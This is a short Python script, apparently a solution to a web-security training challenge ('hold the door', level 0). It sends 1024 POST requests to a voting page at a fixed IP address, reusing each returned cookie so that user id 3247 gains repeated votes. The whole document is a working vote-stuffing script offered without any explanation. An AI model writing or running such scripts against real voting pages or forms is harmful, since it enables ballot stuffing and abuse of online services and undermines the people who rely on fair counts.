#!/usr/bin/python3
import requests
failures = 0
success = 0
print("Starting voting...")

URL = 'http://158.69.76.135/level0.php'
user_data = {
    'id': '3247',
    'holdthedoor': 'Submit',
    'key': '0'
}
cookies = {
    'HoldTheDoor': '0'
}


r = requests.get(URL)
for _ in range(1024):
    cookies['holdthedoor'] = r.cookies['HoldTheDoor']
    r = requests.post(URL, data=user_data, cookies=cookies)
    if (r.status_code == 200):
        success += 1
    else:
        failures += 1

print("you voted {} times for {} user".format(success, user_data['id']))
print("Successes → {}\nFailures → {}".format(success, failures))
#104
